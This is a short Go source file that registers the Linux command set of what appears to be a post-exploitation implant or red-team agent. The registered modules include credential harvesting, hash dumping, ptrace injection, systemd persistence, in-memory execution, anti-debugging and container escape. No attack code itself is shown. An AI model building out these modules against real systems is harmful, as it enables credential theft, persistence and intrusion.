//go:build linux

package commands

// registerPlatformCommands registers Linux-specific commands.
func registerPlatformCommands() {
	RegisterCommand(&CrontabCommand{})
	RegisterCommand(&SSHKeysCommand{})
	RegisterCommand(&SSHAgentCommand{})
	RegisterCommand(&PrivescCheckCommand{})
	RegisterCommand(&ProcInfoCommand{})
	RegisterCommand(&SystemdPersistCommand{})
	RegisterCommand(&ShellConfigCommand{})
	RegisterCommand(&IptablesCommand{})
	RegisterCommand(&LinuxLogsCommand{})
	RegisterCommand(&PtraceInjectCommand{})
	RegisterCommand(&CredHarvestCommand{})
	RegisterCommand(&MemScanCommand{})
	RegisterCommand(&ExecuteMemoryCommand{})
	RegisterCommand(&ScreenshotLinuxCommand{})
	RegisterCommand(&ClipboardCommand{})
	RegisterCommand(&DrivesUnixCommand{})
	RegisterCommand(&DebugDetectCommand{})
	RegisterCommand(&XattrCommand{})
	RegisterCommand(&ContainerEscapeCommand{})
	RegisterCommand(&EnvScanCommand{})
	RegisterCommand(&PtyCommand{})
	RegisterCommand(&BrowserCommand{})
	RegisterCommand(&RunasCommand{})
	RegisterCommand(&GetPrivsCommand{})
	RegisterCommand(&NamedPipesCommand{})
	RegisterCommand(&HandlesCommand{})
	RegisterCommand(&PersistEnumCommand{})
	RegisterCommand(&ServiceCommand{})
	RegisterCommand(&NetUserCommand{})
	RegisterCommand(&HashdumpCommand{})
}
